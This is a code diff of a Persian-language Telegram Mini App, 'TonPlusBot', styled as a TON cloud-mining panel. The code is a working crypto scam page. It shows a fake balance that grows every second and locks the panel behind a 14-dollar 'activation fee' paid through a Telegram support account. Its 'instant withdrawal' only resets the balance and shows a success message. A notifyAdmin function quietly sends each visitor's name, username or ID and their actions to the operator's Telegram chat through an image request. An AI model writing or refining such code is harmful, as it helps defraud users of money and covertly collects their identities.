@@ -2,7 +2,7 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>TonPlusBot - v47 Ultimate</title>
+    <title>TonPlusBot - v47 Ultimate Final</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -17,7 +17,7 @@
             background: #0b1019; color: #fff; padding: 15px; direction: rtl; min-height: 100vh;
         }
 
-        /* کادر شناور برداشت (جدید) */
+        /* کادر شناور برداشت */
         #toast {
             position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
             background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px);
@@ -28,7 +28,6 @@
         }
         #toast.show { top: 30px; }
 
-        /* کارت پروفایل: عکس در راست، متن در چپ */
         .card-profile {
             background: #161d27; border-radius: 20px; padding: 15px;
             margin-bottom: 12px; border: 1px solid #242c37;
@@ -41,8 +40,8 @@
             display: flex; align-items: center; justify-content: center;
             border: 2px solid #242c37; flex-shrink: 0; order: 2;
         }
-        .avatar-container img { width: 100%; height: 100%; object-fit: cover; }
         .avatar-container i { font-size: 30px; color: #fff; }
+        .avatar-container img { width: 100%; height: 100%; object-fit: cover; }
 
         .card {
             background: #161d27; border-radius: 20px; padding: 22px;
@@ -50,7 +49,6 @@
         }
         #balance { font-size: 45px; font-weight: 900; color: #00c6ff; display: block; margin: 5px 0; }
 
-        /* دکمه‌های هماهنگ */
         .btn {
             width: 100%; height: 58px; border-radius: 20px; border: none;
             font-size: 16px; font-weight: 700; cursor: pointer; display: flex;
@@ -58,16 +56,10 @@
             text-decoration: none; margin-bottom: 12px; box-sizing: border-box;
         }
 
-        /* دکمه ولت: متن وسط‌چین و لوگوی کیف پول */
-        #ton-connect-btn { width: 100%; }
         #ton-connect-btn * { 
             width: 100% !important; height: 58px !important; 
-            border-radius: 20px !important; display: flex !important;
-            justify-content: center !important; align-items: center !important;
-            background-color: #0088cc !important; transition: none !important;
-            animation: none !important;
+            border-radius: 20px !important; background-color: #0088cc !important;
         }
-        #ton-connect-btn svg { display: none !important; } /* حذف لوگوی تون */
         #ton-connect-btn button::after {
             content: "\f555"; font-family: "Font Awesome 6 Free"; font-weight: 900;
             margin-left: 10px; font-size: 18px;
@@ -76,9 +68,8 @@
         .withdraw-btn { background: linear-gradient(90deg, #ff512f, #dd2476); }
         .support-btn { background: #1c2431; border: 1px solid #333; }
         .active-btn { background: #1faa59; }
-        .get-code-btn { background: #0088cc; }
 
-        /* پاپ‌آپ فعالسازی (مطابق تصویر) */
+        /* پاپ‌آپ فعالسازی با متن زرد */
         #feeModal {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #0b1019; z-index: 100000; display: flex; align-items: center; justify-content: center;
@@ -87,13 +78,15 @@
             background: #1c1c1c; padding: 30px 18px; border-radius: 30px; width: 92%; text-align: center;
             border: 1px solid #333; box-sizing: border-box;
         }
+        
+        /* این همان کادر زرد رنگ است که پرسیدید */
         .pay-notice {
             background: rgba(0, 0, 0, 0.2); border: 1.5px solid #ffc107;
             color: #ffc107; padding: 15px; border-radius: 20px; font-size: 11px; 
             margin-bottom: 20px; line-height: 1.8; text-align: justify;
         }
-        .fee-tag { border: 2px dashed #00ff9d; color: #00ff9d; padding: 15px; border-radius: 25px; font-weight: 800; font-size: 18px; margin-bottom: 20px; display: block; }
         
+        .fee-tag { border: 2px dashed #00ff9d; color: #00ff9d; padding: 15px; border-radius: 25px; font-weight: 800; font-size: 18px; margin-bottom: 20px; display: block; }
         #activationInput {
             width: 100%; height: 58px; border-radius: 20px; border: 1px solid #333;
             background: #121212; color: #fff; text-align: center; font-size: 17px; margin-bottom: 12px; outline: none;
@@ -109,12 +102,14 @@
     <div class="modal-content">
         <i class="fas fa-lock" style="font-size: 60px; color: #ff512f; margin-bottom: 25px;"></i>
         <h2 style="font-size: 20px; margin-bottom: 15px;">فعالسازی پنل کاربری</h2>
+        
         <div class="pay-notice">
             <i class="fas fa-exclamation-triangle"></i>
             جهت واریز مبلغ کارمزد شبکه، <b>فقط</b> اطلاعات پرداخت را از <b>پشتیبانی رسمی</b> دریافت کنید. هرگونه واریز به آدرس‌های غیررسمی منجر به مسدود شدن حساب می‌گردد.
         </div>
+
         <div class="fee-tag">14 دلار | 2,226,000 تومان</div>
-        <a href="https://t.me/miningertoncoin" class="btn get-code-btn"><i class="fas fa-headset"></i> دریافت رمز و واریز</a>
+        <a href="https://t.me/miningertoncoin" class="btn" style="background:#0088cc;"><i class="fas fa-headset"></i> دریافت رمز و واریز</a>
         <input type="text" id="activationInput" placeholder="Enter Code">
         <button onclick="verifyActivation()" class="btn active-btn">فعالسازی و ورود به پنل</button>
     </div>
@@ -122,8 +117,8 @@
 
 <div class="card-profile">
     <div class="profile-text">
-        <h3 id="uName" style="margin:0; font-size:15px;">TONCOIN SUPPORT</h3>
-        <p id="uTag" style="margin:0; font-size:12px; color:#00c6ff;">@MiningerTonCoin</p>
+        <h3 id="uName" style="margin:0; font-size:15px;">TON USER</h3>
+        <p id="uTag" style="margin:0; font-size:12px; color:#00c6ff;">@username</p>
     </div>
     <div class="avatar-container">
         <i class="fas fa-user-circle" id="defAvat"></i>
@@ -137,9 +132,7 @@
     <div style="font-size:12px; color:#00ff9d; margin-top:8px;"><i class="fas fa-bolt"></i> استخراج ابری فعال است</div>
 </div>
 
-<div class="card">
-    <div id="ton-connect-btn"></div>
-</div>
+<div class="card"><div id="ton-connect-btn"></div></div>
 
 <div style="padding: 0 5px;">
     <button id="withdrawBtn" class="btn withdraw-btn"><i class="fas fa-arrow-up-from-bracket"></i> درخواست برداشت آنی</button>
@@ -155,16 +148,12 @@
     const ADMIN_ID = "5972276401";
 
     function notifyAdmin(action) {
-        const user = tg.initDataUnsafe?.user;
-        const name = user ? user.first_name : "کاربر ناشناس";
-        const username = user?.username ? `@${user.username}` : user?.id || "نامشخص";
-        const text = encodeURIComponent(`📢 گزارش جدید:\n🔹 رویداد: ${action}\n👤 نام: ${name}\n🆔 یوزر: ${username}`);
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${text}&parse_mode=HTML`;
+        const u = tg.initDataUnsafe?.user;
+        const text = encodeURIComponent(`📢 گزارش:\n🔹 رویداد: ${action}\n👤 نام: ${u?.first_name}\n🆔: @${u?.username || u?.id}`);
         const img = new Image();
-        img.src = url;
+        img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${text}`;
     }
 
-    // تابع نمایش اعلان شناور (جدید)
     function showToast(message) {
         const toast = document.getElementById('toast');
         document.getElementById('toastMsg').innerText = message;
@@ -172,30 +161,25 @@
         setTimeout(() => toast.classList.remove('show'), 4000);
     }
 
-    if(localStorage.getItem('isActivated') === 'true') {
-        document.getElementById('feeModal').style.display = 'none';
-    }
+    if(localStorage.getItem('isActivated') === 'true') document.getElementById('feeModal').style.display = 'none';
 
     function verifyActivation() {
-        const val = document.getElementById('activationInput').value.trim();
-        if(val === SECRET_CODE) {
+        if(document.getElementById('activationInput').value.trim() === SECRET_CODE) {
             localStorage.setItem('isActivated', 'true');
             document.getElementById('feeModal').remove();
-            notifyAdmin("✅ فعالسازی موفقیت‌آمیز");
-            tg.showAlert("پنل با موفقیت فعال شد!");
-        } else {
-            tg.showAlert("کد اشتباه است ❌");
-        }
+            notifyAdmin("✅ فعالسازی موفق");
+            tg.showAlert("پنل فعال شد!");
+        } else { tg.showAlert("کد اشتباه است ❌"); }
     }
 
     const u = tg.initDataUnsafe?.user;
     if (u) {
         document.getElementById('uName').innerText = u.first_name;
         document.getElementById('uTag').innerText = u.username ? "@" + u.username : "ID: " + u.id;
-        if (u.photo_url) {
-            const img = document.getElementById('userAvat');
-            img.src = u.photo_url;
-            img.onload = () => { img.classList.remove('hidden'); document.getElementById('defAvat').classList.add('hidden'); };
+        if(u.photo_url) {
+            document.getElementById('userAvat').src = u.photo_url;
+            document.getElementById('userAvat').classList.remove('hidden');
+            document.getElementById('defAvat').classList.add('hidden');
         }
     }
 
@@ -206,29 +190,20 @@
         localStorage.setItem('bal_v47', bal.toString());
     }, 1000);
 
-    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-        manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-bot/tonconnect-manifest.json',
-        buttonRootId: 'ton-connect-btn'
-    });
+    new TON_CONNECT_UI.TonConnectUI({ manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-bot/tonconnect-manifest.json', buttonRootId: 'ton-connect-btn' });
 
-    // کسر موجودی و نمایش اعلان (بخش اصلاح شده)
     document.getElementById('withdrawBtn').onclick = () => {
         if(localStorage.getItem('isActivated') !== 'true') return tg.showAlert("ابتدا فعالسازی کنید");
-        
-        if(bal <= 0) return tg.showAlert("موجودی شما صفر است");
+        if(bal <= 0) return;
 
-        const amountToWithdraw = bal;
+        const amount = bal;
+        notifyAdmin(`💰 درخواست برداشت: ${amount.toFixed(6)} TON`);
         
-        // ۱. ارسال گزارش به شما
-        notifyAdmin(`💰 درخواست برداشت: ${amountToWithdraw.toFixed(6)} TON`);
-        
-        // ۲. کسر موجودی و صفر کردن آن
         bal = 0;
         document.getElementById('balance').innerText = "0.000000";
         localStorage.setItem('bal_v47', "0");
 
-        // ۳. نمایش اعلان شناور بالای صفحه
-        showToast(`مقدار ${amountToWithdraw.toFixed(6)} تون برداشت شد`);
+        showToast(`مقدار ${amount.toFixed(6)} تون برداشت شد`);
     };
 </script>
 </body>
